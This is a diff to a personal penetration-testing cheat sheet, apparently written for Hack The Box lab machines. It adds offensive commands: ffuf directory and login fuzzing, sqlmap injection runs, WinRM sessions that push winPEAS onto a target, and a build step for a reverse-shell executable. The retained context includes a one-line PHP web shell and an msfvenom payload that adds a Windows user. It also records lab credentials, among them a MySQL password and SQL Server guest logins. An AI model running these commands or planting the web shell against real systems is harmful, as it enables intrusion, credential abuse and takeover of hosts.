@@ -30,7 +30,7 @@ export PATH=.:$PATH
   ```
 ## FFUF
   ```
-  ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ/ -mc all -ac
+  ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ/ -mc all -ic
   ffuf -w ./SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
   ffuf -w ./SecLists/Fuzzing/special-chars.txt -u http://10.10.10.70/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
   ffuf -w .\SecLists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
@@ -43,11 +43,19 @@ export PATH=.:$PATH
   ```
   /windows/system32/license.rtf
   ```
+## RSAT
+  ```
+  Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
+  ```
 ## php
   ```
   scandir("/home/dali/.config/psysh")
   file_get_contents("/home/nairobi/ca.key")
   file_put_contents("/home/nairobi/ca.key")
+  ```
+## ntlm
+  ```
+  user::domainname:serverchallenge:NTProofstring:Ntlmv2response
   ```
 ## git
   ```
@@ -71,10 +79,16 @@ export PATH=.:$PATH
   select id from table;
   select * from table \G
   quit
+  mysql -u lewis -pP4ntherg0t1n5r3c0n## -D joomla -e "show tables;"
   ```
 ## sqlmap
   ```
   python3 sqlmap.py --batch --risk 3 --level 5 --technique=BEUSQ --privilege -r ./reqs/tri.req
+  sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
+  ```
+## sqlcmd
+  ```
+  sqlcmd -S sequel.htb -U PublicUser -P GuestUserCantWrite1
   ```
 ## unionselectshell
   ```
@@ -163,9 +177,21 @@ export PATH=.:$PATH
   ```
   ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" -s sub "(objectclass=user)" | grep description,info
   ```
+## winrm
+  ```
+  winrm quickconfig
+  winrm set winrm/config/client @{TrustedHosts="10.10.11.202"}
+  Enter-PSSession -ComputerName 10.10.11.202 -Credential sequel\sql_svc
+  $session = New-PSSession -ComputerName 10.10.11.202 -Credential sequel.htb\Ryan.Cooper
+  Copy-Item -Recurse "C:\Users\Administrator\Htb\www\winpeasx64.exe" -Destination "C:\Users\Ryan.Cooper\Documents\" -ToSession $Session
+  ```  
 ## phpshell
   ```
   <?php echo "Shell":system($_REQUEST['cmd']); ?>
+  ```
+## .net
+  ```
+  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:Simple_Rev_Shell.exe Simple_Rev_Shell.cs
   ```
 ## msfvenom
 ``` 
@@ -214,7 +240,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   ```
   nmap
   wireshark
-  firefox dev
   ffuf
   sqlmap
   seclists
@@ -222,7 +247,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   metasploit
   bloodhound
   crackmapexec
-  Evil-winrm
   wpscan
   ghidra
   dnspy
